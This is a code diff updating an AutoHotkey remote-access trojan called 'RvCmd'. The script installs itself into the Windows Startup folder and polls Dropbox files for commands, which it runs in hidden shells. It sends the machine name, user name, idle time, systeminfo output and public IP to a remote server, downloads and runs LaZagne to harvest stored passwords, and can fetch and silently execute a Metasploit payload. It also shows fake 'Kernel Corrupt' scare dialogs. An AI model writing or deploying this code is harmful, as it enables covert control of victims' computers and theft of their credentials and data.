@@ -1,7 +1,8 @@
-﻿#SingleInstance force
+#SingleInstance force
 #NoTrayIcon
-if A_WorkingDir != C:\Users\%A_UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
-;	annoy(5)
+RvCmdVersion := "1.1"
+if A_WorkingDir != %A_WinDir%Users\%A_UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+	annoy(5)
 binurl := "no"
 	whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
 	whr.Open("GET", "https://www.dropbox.com/s/aitm2yv03u64zit/bin-url.txt?raw=1", true)
@@ -24,19 +25,23 @@ if 1 = update
 
 if	binArr2 = 1
 {
-	IfNotExist, C:\Users\%A_UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\%A_ScriptName%
+	IfNotExist, %A_WinDir%Users\%A_UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\%A_ScriptName%
 	{
-		FileCopy, %A_ScriptName%, C:\Users\%A_UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+		FileCopy, %A_ScriptName%, %A_WinDir%Users\%A_UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 	}
 }
-	temp:=  binurl "log=" A_ComputerName "--" A_UserName ":-_linked_in!"
+
+	temp:=  binurl "log=" A_ComputerName "--" A_UserName ":-_linked_in!_RvCmd version:-" RvCmdVersion
 	whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
 	whr.Open("GET", temp , true)
 	whr.Send()
 	whr.WaitForResponse()
 	temp := whr.ResponseText
 ;OnExit("ExitFunc")
+idlestate := 0
+idletime := 300000
 sleept := 10000
+repcycl := 60
 counter := 0
 last_com_id := 0
 mousean := 0
@@ -44,11 +49,30 @@ sendMode input
 loop
 {
 	sleep %sleept%
-	; Example: Download text to a variable:
+	if (idlestate = 0) and (A_TimeIdlePhysical > idletime)
+	{
+		idlestate = 1
+		temp2 := Round(A_TimeIdlePhysical/1000)
+		temp :=  binurl "AFK=" A_ComputerName "--" A_UserName ":-User_afk_for:-" temp2 "s"
+		whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
+		whr.Open("GET",temp, true)
+		whr.Send()
+		whr.WaitForResponse()
+		temp := whr.ResponseText
+	}
+	if (idlestate = 1) and (A_TimeIdlePhysical < idletime)
+	{
+		temp :=  binurl "AFK=" A_ComputerName "--" A_UserName ":-User_not_afk_anymore!"
+		whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
+		whr.Open("GET",temp, true)
+		whr.Send()
+		whr.WaitForResponse()
+		temp := whr.ResponseText
+		idlestate = 0
+	}
 	whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
 	whr.Open("GET", "https://www.dropbox.com/s/uj1id6b56tg7ex9/Reverse-cmd-command.txt?raw=1", true)
 	whr.Send()
-	; Using 'true' above and the call below allows the script to remain responsive.
 	whr.WaitForResponse()
 	raw1 := whr.ResponseText
 	StringSplit,BaseArray,raw1,;
@@ -63,12 +87,19 @@ loop
 	if counter = 0
 	{
 		if BaseArray2 !=
-			run cmd /c %BaseArray2%
+		{
+			Loop, parse, BaseArray2,^
+			{
+				outar := Interpret(A_LoopField,binurl,mousean,sleept,RvCmdVersion)
+				mousean := outar[1]
+				sleept := outar[2]
+			}
+		}
 	}
 	if counter = 60
 	{
 		counter := 1
-		temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-_still_online!"
+		temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-_still_online!_Afk_time:-" Round(A_TimeIdlePhysical/1000) "s"
 		whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
 		whr.Open("GET",temp, true)
 		whr.Send()
@@ -79,7 +110,7 @@ loop
 	{
 	Loop, parse, commandtemp,^
 	{
-		outar := Interpret(A_LoopField,binurl,mousean,sleept)
+		outar := Interpret(A_LoopField,binurl,mousean,sleept,RvCmdVersion)
 		mousean := outar[1]
 		sleept := outar[2]
 	}
@@ -95,14 +126,15 @@ loop
 		X := X-70
 		Y := Y-80
 		Gui, Show, X%X% Y%Y%
-		Random
+		MouseMove, X, Y , 20
+		
 	}
 return
 
 annoy(val)
 {
 loop{
-	runwait cmd /c ipconfig && cd C:\windows\system32 && dir 
+	runwait cmd /c ipconfig && cd %A_WinDir%\system32 && dir 
 	if A_Index > 1
 		MsgBox, 4405,Kernel Corrupt!,It seems like your windows kernel is corrupt! `nPlease reinstall Windows or contact your local repair shop!
 	else
@@ -133,7 +165,7 @@ ExitFunc(ExitReason, ExitCode)
 }
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
-Interpret(command,binurl,mousean,sleept)
+Interpret(command,binurl,mousean,sleept,RvCmdVersion)
 {
 		StringSplit, SubArray, command, %A_Space%
 
@@ -153,6 +185,94 @@ Interpret(command,binurl,mousean,sleept)
 				sleep 5000
 				Gui, Add, Pic, w100 h100, pedo.png
 				mousean := SubArray3
+			}
+			else if SubArray2 = reportcycles
+			{
+				temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-report_cycles_now:-" SubArray3
+				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
+				whr.Open("GET",temp, true)
+				whr.Send()
+				whr.WaitForResponse()
+				temp := whr.ResponseText
+				repcycl := SubArray3
+			}
+			else if SubArray2 = speak
+			{
+				tempcom := SubStr(command,13)
+				
+				temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-now_speaking:-" tempcom
+				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
+				whr.Open("GET",temp, true)
+				whr.Send()
+				whr.WaitForResponse()
+				temp := whr.ResponseText
+				
+				ComObjCreate("SAPI.SpVoice").Speak(tempcom)
+			}
+			else if SubArray2 = idletime
+			{
+				temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-idletime_now:-" SubArray3
+				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
+				whr.Open("GET",temp, true)
+				whr.Send()
+				whr.WaitForResponse()
+				temp := whr.ResponseText
+				idletime := Subarray3*1000
+			}
+			else if SubArray2 = metasploit
+			{
+				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
+				whr.Open("GET","https://www.dropbox.com/s/92u21ghy5t5v56c/Metasploit.txt?raw=1", true)
+				whr.Send()
+				whr.WaitForResponse()
+				metasploit := whr.ResponseText
+				
+				temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-running_metasploit_command:-" metasploit
+				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
+				whr.Open("GET",temp, true)
+				whr.Send()
+				whr.WaitForResponse()
+				temp := whr.ResponseText
+				
+				run, cmd /c %metasploit%,,Hide
+			
+			
+			}
+			else if SubArray2 = info
+			{
+				DetectHiddenWindows On
+				Run %ComSpec%,, Hide, pid
+				WinWait ahk_pid %pid%
+				DllCall("AttachConsole", "UInt", pid)
+				WshShell := ComObjCreate("Wscript.Shell")
+				exec := WshShell.Exec("systeminfo")
+				Value := exec.StdOut.ReadAll()
+				DllCall("FreeConsole")
+				Process Close, %pid%
+				
+				;MsgBox % StrLen(Value)
+				StringReplace, Value, Value, `r`n, ~, All
+				
+				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
+				whr.Open("GET","https://api.ipify.org", true)
+				whr.Send()
+				whr.WaitForResponse()
+				pubIp := whr.ResponseText
+				
+				temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-SYSTEM_INFO:-~UserName:-" A_UserName "~IsAdmin:-" A_IsAdmin "~Is64bit:-" A_Is64bitOS "~PublicIP:-" pubIp "~Res:-" A_ScreenWidth "x" A_ScreenHeight "~WorkingDir:-" A_WorkingDir "~~" SubStr(Value,1,3000)
+				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
+				whr.Open("GET",temp, true)
+				whr.Send()
+				whr.WaitForResponse()
+				temp := whr.ResponseText
+				
+				temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-SYSTEM_INFO2:-" SubStr(Value,3001)
+				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
+				whr.Open("GET",temp, true)
+				whr.Send()
+				whr.WaitForResponse()
+				temp := whr.ResponseText
+				
 			}
 			else if SubArray2 = urlrun
 			{
@@ -186,7 +306,7 @@ Interpret(command,binurl,mousean,sleept)
 			}
 			else if SubArray2 = report
 			{
-				temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-_still_online!"
+				temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-_still_online!_Afk_time:-" Round(A_TimeIdlePhysical/1000) "s"
 				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
 				whr.Open("GET",temp, true)
 				whr.Send()
@@ -198,11 +318,22 @@ Interpret(command,binurl,mousean,sleept)
 			tempcom := SubStr(command,15)
 			;run, cmd.exe /k echo off & cls & %tempcom% & title OKE
 			;winwait, OKE
-			Value := ComObjCreate("WScript.Shell").Exec("cmd.exe /q /c " tempcom).StdOut.ReadAll()
+			;Value := ComObjCreate("WScript.Shell").Exec("cmd.exe /q /c " tempcom).StdOut.ReadAll()
+			
+			DetectHiddenWindows On
+			Run %ComSpec%,, Hide, pid
+			WinWait ahk_pid %pid%
+			DllCall("AttachConsole", "UInt", pid)
+			WshShell := ComObjCreate("Wscript.Shell")
+			exec := WshShell.Exec("cmd /c " tempcom)
+			Value := exec.StdOut.ReadAll()
+			DllCall("FreeConsole")
+			Process Close, %pid%
+			
 			StringReplace, Value, Value, `r`n, ~, All
 			Vallen := Strlen(Value) + 50
 			;msgBox, %Vallen%
-			loopcount1 := Vallen/8000
+			loopcount1 := Vallen/3000
 			loopcount2 := ceil(loopcount1)
 			if loopcount2 > 1
 			{
@@ -214,8 +345,8 @@ Interpret(command,binurl,mousean,sleept)
 			temp := whr.ResponseText
 			loop %loopcount2% {
 				index := A_Index -1
-				num := index * 8000
-				tempStr := SubStr(Value,num,7999)
+				num := index * 3000
+				tempStr := SubStr(Value,num,2999)
 				temp :=  binurl "data=" A_ComputerName "--" A_UserName ":-sendc:-" tempStr
 				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
 				whr.Open("GET",temp, true)
@@ -249,22 +380,11 @@ Interpret(command,binurl,mousean,sleept)
 				;UrlDownloadToFile,https://www.dropbox.com/s/b14t88dzhenwfcw/lazag.exe?dl=1,lazag.exe
 				;runWait, cmd /c %A_WorkingDir%\lazag.exe
 				;filedelete, lazag.exe
-				UrlDownloadToFile,*0 https://www.dropbox.com/s/y5akkq7sddz04nd/laZagne.exe?dl=1, laz.exe
+				UrlDownloadToFile,*0 https://www.dropbox.com/s/y5akkq7sddz04nd/laZagne.exe?dl=1, %A_Temp%\laz.exe
 
-
-				run, cmd.exe /k echo off & cls & %A_WorkingDir%\laz.exe all & title OKE
-
-				winwait, OKE
-				ClipBoard = 
-				Send ^a
-				sleep 100
-				send {Enter}
-				sleep 100
-				send !{f4}
-				sleep 100
-				filedelete, laz.exe
-				sleep 100
-				data = %ClipBoard%
+				runwait, %A_Temp%\laz.exe all -oN,,Hide
+				
+				
 				data2 := SubStr(data,510)
 				StringReplace, data3, data2,Password found !!!, ``, All  ; Replace each <br> with an accent.
 				StringSplit, dataray, data3, ``  ; Split the string based on the accent character.
@@ -309,7 +429,7 @@ Interpret(command,binurl,mousean,sleept)
 					whr.Send()
 					whr.WaitForResponse()
 					temp := whr.ResponseText
-				filedelete,C:\Users\%A_UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\%A_ScriptName%
+				filedelete,%A_WinDir%Users\%A_UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\%A_ScriptName%
 				ExitApp
 			}
 			else if SubArray2 = sleeptime
@@ -419,7 +539,7 @@ Interpret(command,binurl,mousean,sleept)
 						send, {enter}
 						
 				else if command = AHK
-						send, %AHK%
+						send, %params%
 				
 				else if command = CLIP
 				{
@@ -433,11 +553,20 @@ Interpret(command,binurl,mousean,sleept)
 				sleep, defdel
 				}
 			}
+			else
+			{
+				temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-command:-" SubArray2 "-:wasn´t recognized!_RvCmd version:-" RvCmdVersion
+				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
+				whr.Open("GET",temp, true)
+				whr.Send()
+				whr.WaitForResponse()
+				temp := whr.ResponseText
+			}
 		}
 		else if command !=
 		{
-			run cmd /c %command%
-			temp :=  binurl "log=" A_ComputerName "--" A_UserName ":- ran: " command
+			run cmd /c %command% ,,Hide
+			temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-ran:-" command
 			whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
 			whr.Open("GET",temp, true)
 			whr.Send()
